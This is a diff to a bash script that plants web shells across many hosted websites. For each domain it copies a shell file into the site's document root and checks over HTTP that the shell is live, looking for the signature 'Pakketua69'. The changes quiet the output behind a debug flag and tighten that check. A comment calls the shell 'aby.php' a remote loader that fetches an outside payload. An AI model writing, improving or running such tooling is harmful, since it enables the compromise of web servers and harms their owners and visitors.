@@ -226,35 +226,44 @@ for domain in "${domains_list[@]}"; do
 
         if cp "$SHELL_FILE" "$shell_upload_path" 2>/dev/null; then
             chmod 644 "$shell_upload_path" 2>/dev/null
-            echo "  [*] Shell copied, verifying..."
+
+            if [ $DEBUG -eq 1 ]; then
+                echo "  [*] Shell copied, verifying..."
+            fi
 
             # Verify shell uploaded by checking if file exists
             if [ -f "$shell_upload_path" ]; then
-                echo "  [✓] Shell file exists at: $shell_upload_path"
+                if [ $DEBUG -eq 1 ]; then
+                    echo "  [✓] Shell file exists at: $shell_upload_path"
+                fi
 
-                # Test via HTTP(S)
+                # Test via HTTP(S) and check for signature
                 shell_response=$(curl -s -L --max-time 5 --connect-timeout 3 -k "$shell_url" 2>&1)
 
-                # For aby.php (remote loader), just check if file is accessible
-                # aby.php will either succeed loading remote payload or fail with error
-                if [ -n "$shell_response" ]; then
-                    echo "  [+] Shell uploaded & accessible: $shell_url"
+                # Check if response contains "Pakketua69" signature
+                if echo "$shell_response" | grep -q "Pakketua69"; then
+                    echo "  [+] SHELL ACTIVE (Pakketua69 found): $shell_url"
                     SHELLS_DEPLOYED+=("$shell_url")
-                    # Show first line of response
-                    first_line=$(echo "$shell_response" | head -1)
-                    echo "      Response: $first_line"
+                    if [ $DEBUG -eq 1 ]; then
+                        echo "      Full response: $shell_response"
+                    fi
                 else
-                    echo "  [-] Shell uploaded but HTTP request got no response"
-                    # Still consider it success if file exists
-                    echo "  [+] Shell deployed (file verified): $shell_url"
-                    SHELLS_DEPLOYED+=("$shell_url")
+                    if [ $DEBUG -eq 1 ]; then
+                        echo "  [-] Shell uploaded but Pakketua69 NOT found"
+                        first_line=$(echo "$shell_response" | head -1)
+                        echo "      Response: $first_line"
+                    else
+                        echo "  [-] Shell uploaded but not active (no Pakketua69)"
+                    fi
                 fi
             else
                 echo "  [-] Failed to verify shell file at: $shell_upload_path"
             fi
         else
             echo "  [-] Failed to upload shell (copy failed)"
-            echo "      Check permissions for: $doc_root"
+            if [ $DEBUG -eq 1 ]; then
+                echo "      Check permissions for: $doc_root"
+            fi
         fi
     else
         echo "✗ $domain - not accessible (doc_root: $doc_root)"
